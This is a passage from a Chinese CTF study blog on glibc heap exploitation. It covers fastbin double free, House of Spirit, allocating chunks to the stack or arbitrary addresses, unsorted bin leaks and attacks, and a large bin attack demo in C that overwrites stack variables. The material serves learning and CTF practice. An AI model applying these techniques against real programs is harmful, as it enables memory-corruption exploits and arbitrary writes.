class="hljs-number">0x602060</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602070</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x602080</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000041</span> &lt;=== chunk3<br><span class="hljs-number">0x602090</span>:   <span class="hljs-number">0x0000000000602040</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020a0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020b0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x6020c0</span>:   <span class="hljs-number">0x0000000000000000</span>  <span class="hljs-number">0x0000000000020f41</span> &lt;=== top chunk<br></code></pre></td></tr></table></figure><p>可以看到此时的三个 chunk 组成了一个单向链表</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c">Fastbins[idx=<span class="hljs-number">2</span>, size=<span class="hljs-number">0x30</span>,ptr=<span class="hljs-number">0x602080</span>]<br>===&gt;Chunk(fd=<span class="hljs-number">0x602040</span>, size=<span class="hljs-number">0x40</span>, flags=PREV_INUSE)<br>===&gt;Chunk(fd=<span class="hljs-number">0x602000</span>, size=<span class="hljs-number">0x40</span>, flags=PREV_INUSE)<br>===&gt;Chunk(fd=<span class="hljs-number">0x000000</span>, size=<span class="hljs-number">0x40</span>, flags=PREV_INUSE)<br></code></pre></td></tr></table></figure><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>fastbin中chunk可以被多次释放，因此可以在fastbin链表存在多次，这样导致多次从fastbin链表取出同一块堆块，相当于多个指针指向同一个堆块</p><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><ul><li>fastbin的堆块释放后next_chunk的pre_inuse位不会清空</li><li>fastbinfree时仅验证main_arena直接指向的块，对于链表后的块并没有验证</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Another simple check: make sure the top of the bin is not the</span><br><span class="hljs-comment">       record we are going to add (i.e., double free).  */</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>      &#123;<br>        errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>        <span class="hljs-keyword">goto</span> errout;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><p>fastbin是FIFO机制</p><p>我们可以在chunk1释放后再释放chunk2，这样使main_arena指向chunk2，此时再次释放chunk1就不会被检测到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">void</span> *chunk1,*chunk2,*chunk3;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br>    chunk2=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-built_in">free</span>(chunk2);<br>    <span class="hljs-built_in">free</span>(chunk1);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>第一次<code>free</code></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%87%BB/1743521938798.png" alt="diyici"></p><p>第二次<code>free</code></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%87%BB/1743521962305.png" alt="dierci"></p><p>第三次<code>free</code></p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%87%BB/1743522158810.png" alt="disanci"></p><p>此时chunk1的fd指向了chunk2</p><p>接着malloc将第一个chunk1释放掉，再修改chunk1中fd指针为target_addr，这样Fastbin就变成了main_arena-&gt;chunk2-&gt;chunk1-&gt;target_addr，这样我们就可以分配到target_addr处的堆块，这样就可以在此进行读写</p><p><strong>但int_malloc_会对即将分配位置的size域检查，如果size和当前fastbin链表应该有size不符就抛出异常</strong></p><h2 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h2><h3 id="核心"><a href="#核心" class="headerlink" title="核心"></a>核心</h3><p>该技术核心在于在目标位置伪造fastbin chunk，并将其释放，从而达到分配<strong>指定地址</strong>的chunk的目的</p><h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><p>想伪造fastbin chunk并放入fastbin链表中，那么就要绕过一些必要的检查</p><ul><li>fake chunk的<strong>ISMMAP位不能为1</strong>，因为mmap分配的chunk会被单独处理</li><li>fake chunk的地址需要<strong>对齐</strong></li><li>fake chunk的size的大小需要<strong>满足fastbin的要求，同时需要对齐</strong></li><li>fask chunk的next chunk的大小不能小于<code>2*SIZE_SZ</code>，同时不能大于<code>av-&gt;system_mem</code></li><li>fake chunk对应的fastbin<strong>链表头不能是fake chunk</strong>，即不能构成double free情况</li></ul><p>（以上注意事项源码里都有）</p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>该技术分配chunk到指定地址，其实不需要修改指定地址的任何内容，<strong>关键是要能够修改指定地址前后的内容使其能够绕过检测</strong></p><h2 id="Alloc-to-Stack"><a href="#Alloc-to-Stack" class="headerlink" title="Alloc to Stack"></a>Alloc to Stack</h2><h3 id="原理-5"><a href="#原理-5" class="headerlink" title="原理"></a>原理</h3><p>关键在于劫持 fastbin 链表里的 chunk 的<code>fd</code>指针，把<code>fd</code>指针指向我们想要分配的栈上，从而控制栈上的一些关键数据，比如返回地址等</p><h3 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h3><p>该代码将 fake_chunk 置于栈中的称为 stack_chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">chunk</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> pre_size;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> size;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> fd;<br>    <span class="hljs-type">long</span> <span class="hljs-type">long</span> bk;<br>&#125; CHUNK,*PCHUNK;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    CHUNK stack_chunk;<br><br>    <span class="hljs-type">void</span> *chunk1;<br>    <span class="hljs-type">void</span> *chunk_a;<br><br>    stack_chunk.size=<span class="hljs-number">0x21</span>;<br>    chunk1=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<br><br>    <span class="hljs-built_in">free</span>(chunk1);<br><br>    *(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)chunk1=&amp;stack_chunk;<span class="hljs-comment">//修改fd指针为stack_chunk</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//第一次分配使fastbin链表指向了stack_chunk，意味着下一次分配会用stack_chunk进行</span><br>    chunk_a=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//此时分配的就是stack_chunk了</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>通过该技术我们可以把 fastbin chunk 分配到栈中，从而控制返回地址等关键数据。要实现这一点我们需要<strong>劫持 fastbin 中 chunk 的 fd 域</strong>，把它指到栈上，当然同时需要栈上存在有<strong>满足条件的 size 值</strong>。 </p><h2 id="Arbirary-Alloc"><a href="#Arbirary-Alloc" class="headerlink" title="Arbirary Alloc"></a>Arbirary Alloc</h2><h3 id="原理-6"><a href="#原理-6" class="headerlink" title="原理"></a>原理</h3><p>与Alloc to Stack完全相同，唯一区别是目标不再是栈中，事实上只要目标地址存在合法size域（人为的还是自然的都无所谓），我们可以把chunk分配到任意的可写内存中，比如bss、heap、data、stack等</p><h3 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a>总结</h3><p>Arbitrary Alloc在CTF中用的更加频繁。我们可以利用字节错位等方法来绕过size域的检查，实现任意地址分配chunk，最后效果也就相当于任意地址写任意值</p><h1 id="Unsorted-Bin-Attack"><a href="#Unsorted-Bin-Attack" class="headerlink" title="Unsorted Bin Attack"></a>Unsorted Bin Attack</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><ul><li>Unsorted Bin Attack 被利用前提：控制Unsorted Bin Chunk的bk指针</li><li>Unsorted Bin Attack 可以达到的效果是实现修改任意地址值为一个较大的数值</li></ul><h2 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h2><h3 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h3><ul><li>当一个较大的chunk分割成两半时，若剩下的大于MINSIZE<br>，就会被放到unsorted bin中</li><li>释放一个不属于fastbin的chunk且其不与top chunk相邻时，就会首先被放到unsorted bin中</li></ul><h3 id="使用情况"><a href="#使用情况" class="headerlink" title="使用情况"></a>使用情况</h3><ol><li>遍历顺序：FIFO <strong>插入时插入到unsorted bin头部，取出时从链表尾获取</strong></li><li>malloc 时，如果从fastbin和small bin中找不到对应大小的chunk，就会尝试从unsorted bin中寻找chunk，<strong>若满足用户，就返回给用户，否则放到对应的chunk中</strong></li></ol><h2 id="Unsorted-Bin-Leak"><a href="#Unsorted-Bin-Leak" class="headerlink" title="Unsorted Bin Leak"></a>Unsorted Bin Leak</h2><h3 id="Unsorted-bin结构"><a href="#Unsorted-bin结构" class="headerlink" title="Unsorted bin结构"></a>Unsorted bin结构</h3><p>双向链表</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%87%BB/1744214176709.png" alt="结构"></p><p>可以看到链表中的尾节点的 <code>fd</code> 指针会指向 <code>main_arena</code> 结构体内部。 </p><h3 id="Leak原理"><a href="#Leak原理" class="headerlink" title="Leak原理"></a>Leak原理</h3><ul><li>泄露<code>fd</code>指针，得到一个与<code>main_arena</code>有<strong>固定偏移</strong>的地址</li><li>这个地址相对于 <code>libc</code> 基址是固定的偏移，从而实现对<code>ASLR</code>的绕过</li></ul><h3 id="获取main-arena和libc基址偏移"><a href="#获取main-arena和libc基址偏移" class="headerlink" title="获取main_arena和libc基址偏移"></a>获取main_arena和libc基址偏移</h3><h4 id="malloc-trim函数得出"><a href="#malloc-trim函数得出" class="headerlink" title="_malloc_trim函数得出"></a>_malloc_trim函数得出</h4><p>将.<code>so</code>文件放到IDA中，找到<code>__malloc_trim</code>函数，就可以获得偏移了</p><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%87%BB/1744215074848.png" alt="IDA"></p><h4 id="通过-malloc-hook算出"><a href="#通过-malloc-hook算出" class="headerlink" title="通过_malloc_hook算出"></a>通过_malloc_hook算出</h4><p><code>main_arena</code>和<code>_malloc_hook</code>的地址差是0x10，而大多数libc都可以直接查出<code>_malloc_hook</code>的地址，这样就可以减少工作量</p><p>pwntools:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">main_arena_offset = ELF(<span class="hljs-string">&quot;libc.so.6&quot;</span>).symbols[<span class="hljs-string">&quot;__malloc_hook&quot;</span>] + <span class="hljs-number">0x10</span><br></code></pre></td></tr></table></figure><h3 id="实现leak"><a href="#实现leak" class="headerlink" title="实现leak"></a>实现leak</h3><ul><li>一般需要有 <code>UAF</code>，将一个 chunk 放入 <code>Unsorted Bin </code>中后再打出其 <code>fd</code>。一般的笔记管理题都会有<code> show</code> 的功能，对处于链表尾的节点 <code>show </code>就可以获得 libc 的基地址了</li><li>CTF中的利用，堆往往是刚初始化的，所以<code>Unsorted Bin</code>中是干净的，当里面只有一个<code>bin</code>时，该<code>bin</code>的<code>fd</code>和<code>bk</code>都会指向<code>main_arena</code></li><li>当链表尾无法访问时，可以访问链表头，对链表头的<code>printf</code>往往可以把<code>fd</code>和<code>bk</code>一起输出出来，但在64位环境下，高地址往往是<code>\x00</code>截断<code>printf</code>的输出，无法做到有效leak</li></ul><h2 id="Unsorted-Bin-Attack原理"><a href="#Unsorted-Bin-Attack原理" class="headerlink" title="Unsorted Bin Attack原理"></a>Unsorted Bin Attack原理</h2><p>当将一个 unsorted bin 取出时，会将<code>bck-&gt;fd</code>位置写入本unsorted bin的位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* remove from unsorted list */</span><br><span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))<br>  malloc_printerr (<span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);<br>unsorted_chunks (av)-&gt;bk = bck;<br>bck-&gt;fd = unsorted_chunks (av);<br></code></pre></td></tr></table></figure><p>也就是说如果我们控制了<code>bk</code>的值，我们就能将<code>unsorted_chunk</code>写到任意地址</p><h2 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h2><p><img src="/2025/01/18/%E5%A4%87%E6%B3%A8/%E5%87%BB/1744300551204.png" alt="图示"></p><ul><li>初始：<ul><li>unsorted bin 的 <code>fd</code>、<code>bk</code>都指向本身</li></ul></li><li>free(p)<ul><li>由于p大小不属于fast bin，所以其会被先放到unsorted bin中</li></ul></li><li>修改p[1]<ul><li>修改后，原来在unsorted bin中的p的bk就会指向target-0x10处的伪造的chunk，Taget valus处于伪造的chunk的fd处</li></ul></li><li>申请400大小的chunk<ul><li>此时申请的chunk在small bin范围内，但bin中没有chunk，所以去unsorted bin中找，发现其不为空，于是取出最后一个chunk</li></ul></li><li>结果<ul><li>修改target处的值为unsorted bin链表头地址</li><li>可以修改任意地址但是修改的值却不受我们的控制</li></ul></li><li>作用<ul><li>我们通过修改循环的次数来使得程序可以执行多次循环。</li><li>我们可以修改 heap 中的 global_max_fast 来使得更大的 chunk 可以被视为 fast bin，这样我们就可以去执行一些 fast bin attack 了。</li></ul></li></ul><h1 id="Large-Bin-Attack"><a href="#Large-Bin-Attack" class="headerlink" title="Large Bin Attack"></a>Large Bin Attack</h1><h2 id="原理-7"><a href="#原理-7" class="headerlink" title="原理"></a>原理</h2><p>主要利用chunk进入bin中的操作，在malloc时，遍历unsorted bin，对每一个chunk，若无法exact-fit分配（精准匹配分配）或不满足切割分配的要求，就会将chunk置入大小对应的bin中，<strong>而此过程缺乏对large bin跳表指针（fd_nextsize和bk_nextsize）的检查</strong></p><p>2.29版本及以下，根据unsorted bin大小不同</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br></code></pre></td></tr></table></figure><p>unsorted bin小于链表中最小的chunk时候执行<strong>前一句</strong>，else后一句</p><p>当<strong>二者大小相同</strong>时执行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size<br>              == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) chunksize_nomask (fwd))<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br></code></pre></td></tr></table></figure><p>所以此时<strong>无法利用</strong>（将新堆块插入到链表第二个位置，是固定的，不会影响<code>fd_nextsize</code>和<code>bk_nextsize</code>，所以无法利用）</p><p>所以有两种利用方法</p><p>在2.30版本新加入对large bin跳表的完整性的检查，使unsorted chunk<strong>大于</strong>链表中最小的chunk的时候利用<strong>失效</strong>，<strong>必须使unsorted bin小于链表中最小的chunk</strong>，通过</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br></code></pre></td></tr></table></figure><p>实现将本chunk的地址写入到<code>bk_nextsize+0x20</code>处</p><h2 id="例子-2"><a href="#例子-2" class="headerlink" title="例子"></a>例子</h2><p>核心源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span><br>            &#123;<br>                victim-&gt;fd_nextsize = fwd;<br>                victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                fwd-&gt;bk_nextsize = victim;<br>                victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br>            &#125;<br>            bck = fwd-&gt;bk;<br></code></pre></td></tr></table></figure><p>例子：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// gcc large_bin_attack.c -o large_bin_attack -g</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;This file demonstrates large bin attack by writing a large unsigned long value into stack\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;In practice, large bin attack is generally prepared for further attacks, such as rewriting the &quot;</span><br>                    <span class="hljs-string">&quot;global variable global_max_fast in libc for further fastbin attack\n\n&quot;</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var1 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var2 = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s first look at the targets we want to rewrite on stack:\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %ld\n&quot;</span>, &amp;stack_var1, stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %ld\n\n&quot;</span>, &amp;stack_var2, stack_var2);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x320</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate the first large chunk on the heap at: %p\n&quot;</span>, p1 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>                    <span class="hljs-string">&quot; the first large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Then, we allocate the second large chunk on the heap at: %p\n&quot;</span>, p2 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the next large chunk with&quot;</span><br>                    <span class="hljs-string">&quot; the second large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *p3 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x400</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span><br>                    <span class="hljs-string">&quot; the third large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-comment">//以上总结：分配了p1,p2,p3大小分配为0x420,0x500,0x500(中间0x20堆块起保护作用，防止合并)</span><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br><span class="hljs-comment">//free掉p1,p2，此时在unsorted bin中</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span><br>                    <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,<br>            (<span class="hljs-type">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<span class="hljs-comment">//这一句做了很多事：1.由于这里nalloc了但没有满足要求的，所以将p1放入small bins中，将p2放入largebin中 2.现在unsorted bin空，从smallbin中分配，分配了0x90，并且将剩下的chunk(0x330-0xa0)放入unsorted bin中，所以现在unsorted bin中有一个chunk：0x290，largebin中也有一个chunk：0x410</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span><br>                    <span class="hljs-string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span><br>                    <span class="hljs-string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span><br>                    <span class="hljs-string">&quot; [ %p ]\n\n&quot;</span>,<br>            (<span class="hljs-type">void</span> *)((<span class="hljs-type">char</span> *)p1 + <span class="hljs-number">0x90</span>));<br><br>    <span class="hljs-built_in">free</span>(p3);<span class="hljs-comment">//p3进入unsortedbin中，此时unsortbin中有两个空闲chunk，从头到尾分配时p3(0x410)，那个分割的chunk(0x290)</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span><br>                    <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,<br>            (<span class="hljs-type">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p3[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span><br>                    <span class="hljs-string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span><br>                    <span class="hljs-string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span><br>                    <span class="hljs-string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);<br><span class="hljs-comment">//开始构造，p2是那个放到largebin中的chunk</span><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>; <span class="hljs-comment">//size</span><br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//fd</span><br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//fd_nextsize</span><br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>); <span class="hljs-comment">//bk，指向stack_var1-0x10的位置</span><br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<span class="hljs-comment">//bk_nextsize，指向stack_var2-0x20的位置，修改后结构图如下图</span><br><br>    <span class="hljs-comment">//------------------------------------</span><br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<span class="hljs-comment">//与第一个malloc(0x90)过程类似，从unsorted bin中拿出最后一个chunk放入smallbin中，接着p3要被放入到largebin中，此时会对p2,p3大小比较很明显p2v0x3F0小于p3 0x510，这里结合源码写在下面</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span><br>                    <span class="hljs-string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br><br>    